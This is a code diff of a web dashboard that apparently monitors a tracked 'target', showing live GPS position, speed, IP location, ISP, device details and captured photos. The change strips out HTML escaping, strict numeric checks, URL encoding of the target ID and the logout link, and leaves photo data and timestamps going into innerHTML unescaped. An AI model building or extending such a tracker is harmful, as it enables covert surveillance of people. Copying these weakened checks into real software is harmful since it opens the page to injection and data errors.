@@ -312,13 +312,8 @@
                 <span class="status-badge" id="status-badge">Live Tracking</span>
             </div>
         </div>
-        <div style="display: flex; align-items: center; gap: 16px;">
-            <div style="font-size: 13px; color: var(--text-muted);" id="last-updated-text">
-                Last seen: Just now
-            </div>
-            <a href="/logout" class="btn-back" style="background: rgba(239, 68, 68, 0.2); color: #fca5a5; border: 1px solid rgba(239, 68, 68, 0.3);">
-                <i class="fas fa-right-from-bracket"></i> Logout
-            </a>
+        <div style="font-size: 13px; color: var(--text-muted);" id="last-updated-text">
+            Last seen: Just now
         </div>
     </header>
 
@@ -433,24 +428,8 @@
     <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
     <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
     <script>
-        function escapeHtml(str) {
-            if (str === null || str === undefined) return '';
-            return String(str)
-                .replace(/&/g, '&amp;')
-                .replace(/</g, '&lt;')
-                .replace(/>/g, '&gt;')
-                .replace(/"/g, '&quot;')
-                .replace(/'/g, '&#039;');
-        }
-
-        function safeFormatNum(val, decimals = 4) {
-            if (typeof val !== 'number' || isNaN(val)) return 'N/A';
-            return val.toFixed(decimals);
-        }
-
-        const rawTargetId = new URLSearchParams(location.search).get("id");
-        const targetId = rawTargetId ? rawTargetId.trim() : null;
-        document.getElementById('display-id').innerText = targetId ? escapeHtml(targetId) : 'Unknown';
+        const targetId = new URLSearchParams(location.search).get("id");
+        document.getElementById('display-id').innerText = targetId || 'Unknown';
 
         const defaultCoords = [20.5937, 78.9629];
         const map = L.map('map').setView(defaultCoords, 5);
@@ -464,7 +443,7 @@
         let accuracyCircle = null;
 
         function updateMapPosition(lat, lng, accuracy) {
-            if (typeof lat !== 'number' || typeof lng !== 'number' || isNaN(lat) || isNaN(lng)) return;
+            if (!lat || !lng) return;
             const latLng = [lat, lng];
 
             if (!marker) {
@@ -474,7 +453,7 @@
                 marker.setLatLng(latLng);
             }
 
-            if (typeof accuracy === 'number' && !isNaN(accuracy) && accuracy > 0) {
+            if (accuracy) {
                 if (!accuracyCircle) {
                     accuracyCircle = L.circle(latLng, { radius: accuracy, color: '#3b82f6', fillColor: '#3b82f6', fillOpacity: 0.15 }).addTo(map);
                 } else {
@@ -487,32 +466,25 @@
         function renderTargetData(target) {
             if (!target) return;
 
-            // Render Map with strict number checking (supports 0,0 coordinates)
-            if (typeof target.lat === 'number' && typeof target.lng === 'number' && !isNaN(target.lat) && !isNaN(target.lng)) {
+            // Render Map
+            if (target.lat && target.lng) {
                 updateMapPosition(target.lat, target.lng, target.accuracy);
-                document.getElementById('val-lat').innerText = safeFormatNum(target.lat, 5);
-                document.getElementById('val-lng').innerText = safeFormatNum(target.lng, 5);
-                document.getElementById('val-acc').innerText = (typeof target.accuracy === 'number' && !isNaN(target.accuracy)) ? `±${Math.round(target.accuracy)}m` : 'N/A';
-                
-                // Convert Geolocation speed (m/s) to km/h (m/s * 3.6)
-                if (typeof target.speed === 'number' && !isNaN(target.speed) && target.speed > 0) {
-                    const speedKmH = target.speed * 3.6;
-                    document.getElementById('val-speed').innerText = `${safeFormatNum(speedKmH, 1)} km/h`;
-                } else {
-                    document.getElementById('val-speed').innerText = '0 km/h';
-                }
+                document.getElementById('val-lat').innerText = target.lat.toFixed(5);
+                document.getElementById('val-lng').innerText = target.lng.toFixed(5);
+                document.getElementById('val-acc').innerText = target.accuracy ? `±${Math.round(target.accuracy)}m` : 'N/A';
+                document.getElementById('val-speed').innerText = target.speed ? `${target.speed.toFixed(1)} km/h` : '0 km/h';
             }
 
             // Render IP Location details
             if (target.ipLocation) {
-                const ip = escapeHtml(target.ipLocation.ip || '');
-                const city = escapeHtml(target.ipLocation.city || '');
-                const region = escapeHtml(target.ipLocation.region || '');
-                const country = escapeHtml(target.ipLocation.country || '');
+                const ip = target.ipLocation.ip || '';
+                const city = target.ipLocation.city || '';
+                const region = target.ipLocation.region || '';
+                const country = target.ipLocation.country || '';
                 const locationParts = [city, region, country].filter(Boolean);
                 const locationStr = locationParts.length > 0 ? locationParts.join(', ') : 'Cellular Location';
                 document.getElementById('val-ip-loc').innerText = `${locationStr} ${ip ? '(' + ip + ')' : ''}`;
-                document.getElementById('val-isp').innerText = escapeHtml(target.ipLocation.isp || 'Mobile Carrier / ISP');
+                document.getElementById('val-isp').innerText = target.ipLocation.isp || 'Mobile Carrier / ISP';
             } else {
                 document.getElementById('val-ip-loc').innerText = 'Detected via GPS';
                 document.getElementById('val-isp').innerText = 'Mobile Carrier Network';
@@ -532,10 +504,10 @@
 
             // Render Device Details
             if (target.device) {
-                document.getElementById('val-os').innerText = escapeHtml(target.device.os || 'N/A');
-                document.getElementById('val-browser').innerText = escapeHtml(target.device.browser || 'N/A');
-                document.getElementById('val-screen').innerText = escapeHtml(target.device.screen || 'N/A');
-                document.getElementById('val-network').innerText = escapeHtml(target.device.network || 'N/A');
+                document.getElementById('val-os').innerText = target.device.os || 'N/A';
+                document.getElementById('val-browser').innerText = target.device.browser || 'N/A';
+                document.getElementById('val-screen').innerText = target.device.screen || 'N/A';
+                document.getElementById('val-network').innerText = target.device.network || 'N/A';
             }
 
             // Render Photos
@@ -550,8 +522,8 @@
                     item.className = 'photo-item';
                     const timeStr = new Date(p.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
                     item.innerHTML = `
-                        <img src="${p.data}" alt="Capture ${escapeHtml(timeStr)}">
-                        <div class="photo-time">${escapeHtml(timeStr)}</div>
+                        <img src="${p.data}" alt="Capture ${timeStr}">
+                        <div class="photo-time">${timeStr}</div>
                     `;
                     item.addEventListener('click', () => openLightbox(p.data));
                     photoGrid.appendChild(item);
@@ -581,7 +553,7 @@
         async function fetchTargetDetails() {
             if (!targetId) return;
             try {
-                const res = await fetch(`/api/targets/${encodeURIComponent(targetId)}`);
+                const res = await fetch(`/api/targets/${targetId}`);
                 const data = await res.json();
                 if (data) renderTargetData(data);
             } catch (err) {
